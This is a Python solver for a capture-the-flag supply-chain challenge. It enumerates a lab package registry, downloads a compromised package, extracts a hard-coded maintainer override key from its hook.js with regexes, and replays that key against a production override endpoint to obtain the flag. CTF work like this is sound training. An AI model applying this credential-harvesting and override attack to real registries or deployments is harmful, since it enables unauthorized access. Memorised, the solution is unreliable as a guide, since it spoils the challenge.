#!/usr/bin/env python3
"""
Automated Solver for X03 (Dooms Supply Chain)
Demonstrates the end-to-end supply-chain exploit chain:
Developer App -> Package Registry -> Affected Artifact -> CI Trace -> Image Layer -> Production Override -> Flag.
"""

import argparse
import io
import json
import re
import sys
import tarfile
import urllib.request
import urllib.error

def solve(host: str, port: int) -> str:
    base_url = f"http://{host}:{port}"
    print(f"[*] Connecting to X03 Supply Chain target at {base_url}...")

    # Step 1: Initial Discovery & Architecture Probe
    print("[1] Querying Developer App Platform info...")
    try:
        req = urllib.request.Request(f"{base_url}/api/app/info")
        with urllib.request.urlopen(req, timeout=5) as resp:
            info = json.loads(resp.read().decode())
            print(f"    [+] Platform: {info.get('platform')} ({info.get('version')})")
    except Exception as e:
        print(f"    [-] Failed to reach /api/app/info: {e}")
        sys.exit(1)

    # Step 2: Enumerate Package Registry
    print("[2] Enumerating published packages in internal package repository...")
    try:
        req = urllib.request.Request(f"{base_url}/api/packages")
        with urllib.request.urlopen(req, timeout=5) as resp:
            pkg_data = json.loads(resp.read().decode())
            packages = pkg_data.get("packages", [])
            print(f"    [+] Found {len(packages)} internal packages:")
            for p in packages:
                print(f"        - {p['name']} (latest: {p.get('latest')})")
    except Exception as e:
        print(f"    [-] Failed to enumerate packages: {e}")
        sys.exit(1)

    # Step 3: Inspect Package Metadata for @latveria/sentinel-guard
    target_pkg = "@latveria/sentinel-guard"
    print(f"[3] Inspecting package metadata and release provenance for '{target_pkg}'...")
    try:
        req = urllib.request.Request(f"{base_url}/api/packages/{target_pkg}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            sentinel_meta = json.loads(resp.read().decode())
            versions = sentinel_meta.get("versions", {})
            print(f"    [+] Available versions: {list(versions.keys())}")
            
            # Identify suspicious / affected version
            affected_ver = "2.1.2-hotfix"
            if affected_ver not in versions:
                affected_ver = sentinel_meta.get("dist-tags", {}).get("latest")
            print(f"    [+] Target affected package version: {affected_ver}")
            
            tarball_url_path = versions[affected_ver]["dist"]["tarball"]
            print(f"    [+] Tarball endpoint: {tarball_url_path}")
    except Exception as e:
        print(f"    [-] Failed to inspect package metadata: {e}")
        sys.exit(1)

    # Step 4: Download and Decompress Package Archive (.tgz)
    print(f"[4] Downloading package archive '{tarball_url_path}'...")
    try:
        full_tarball_url = f"{base_url}{tarball_url_path}"
        req = urllib.request.Request(full_tarball_url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            tar_bytes = resp.read()
            print(f"    [+] Downloaded tarball size: {len(tar_bytes)} bytes")
            
        # Parse tar.gz archive in memory
        with tarfile.open(fileobj=io.BytesIO(tar_bytes), mode="r:gz") as tar:
            members = tar.getnames()
            print(f"    [+] Archive contents: {members}")
            
            # Extract and read hook.js or sentinel.js
            hook_file = tar.extractfile("lib/hook.js")
            hook_content = hook_file.read().decode("utf-8")
            
            # Extract override parameters using regex
            override_key_match = re.search(r"OVERRIDE_KEY\s*=\s*['\"]([^'\"]+)['\"]", hook_content)
            action_match = re.search(r"REQUIRED_ACTION\s*=\s*['\"]([^'\"]+)['\"]", hook_content)
            role_match = re.search(r"REQUIRED_ROLE\s*=\s*['\"]([^'\"]+)['\"]", hook_content)
            target_match = re.search(r"REQUIRED_TARGET\s*=\s*['\"]([^'\"]+)['\"]", hook_content)
            
            if not (override_key_match and action_match and role_match and target_match):
                print("    [-] Failed to extract override parameters from hook.js")
                sys.exit(1)
                
            override_key = override_key_match.group(1)
            action = action_match.group(1)
            role = role_match.group(1)
            target = target_match.group(1)
            
            print(f"    [+] Extracted Maintainer Override Credentials:")
            print(f"        - Key:    {override_key}")
            print(f"        - Action: {action}")
            print(f"        - Role:   {role}")
            print(f"        - Target: {target}")
    except Exception as e:
        print(f"    [-] Failed to analyze package archive: {e}")
        sys.exit(1)

    # Step 5: Trace CI Pipeline Build & Container Image
    print("[5] Tracing build provenance and OCI container image in CI...")
    try:
        req = urllib.request.Request(f"{base_url}/api/ci/builds/201")
        with urllib.request.urlopen(req, timeout=5) as resp:
            build_detail = json.loads(resp.read().decode())
            print(f"    [+] Build #201 status: {build_detail.get('status')}")
            print(f"    [+] Output Image: {build_detail.get('output_image')}")
            print(f"    [+] Resolved Submodule: {build_detail.get('resolved_packages', {}).get('@latveria/sentinel-guard')}")
    except Exception as e:
        print(f"    [-] CI trace warning: {e}")

    # Step 6: Verify Production Cluster Status
    print("[6] Querying Production Deployment Status...")
    try:
        req = urllib.request.Request(f"{base_url}/api/deployment/status")
        with urllib.request.urlopen(req, timeout=5) as resp:
            dep_status = json.loads(resp.read().decode())
            print(f"    [+] Mainframe Cluster: {dep_status.get('cluster')}")
            print(f"    [+] Active Image: {dep_status.get('active_image')}")
            print(f"    [+] Active Modules: {dep_status.get('active_modules')}")
    except Exception as e:
        print(f"    [-] Deployment query warning: {e}")

    # Step 7: Transmit Maintainer Override & Recover Flag
    print("[7] Transmitting maintainer override payload to /api/deployment/override...")
    try:
        payload = json.dumps({
            "action": action,
            "target": target,
            "role": role
        }).encode("utf-8")
        
        req = urllib.request.Request(
            f"{base_url}/api/deployment/override",
            data=payload,
            headers={
                "Content-Type": "application/json",
                "X-Latveria-Override-Key": override_key
            }
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            result = json.loads(resp.read().decode())
            print(f"    [+] Override Status: {result.get('status')}")
            print(f"    [+] Authorization:  {result.get('authorization')}")
            print(f"    [+] Message:        {result.get('message')}")
            
            flag = result.get("flag", "")
            if flag and (flag.startswith("DOOM{") or flag.startswith("FLAG{") or flag.startswith("YUVA{")):
                print("\n========================================================")
                print(f"[+] SUCCESS! RECOVERED FLAG: {flag}")
                print("========================================================\n")
                return flag
            else:
                print(f"[-] Flag missing or invalid in response: {result}")
                sys.exit(1)
    except Exception as e:
        print(f"[-] Failed to execute override request: {e}")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="X03 Supply Chain Solver")
    parser.add_argument("--host", default="127.0.0.1", help="Target host")
    parser.add_argument("--port", type=int, default=8093, help="Target port (default 8093)")
    args = parser.parse_args()

    flag = solve(args.host, args.port)
    if not flag:
        sys.exit(1)

if __name__ == "__main__":
    main()
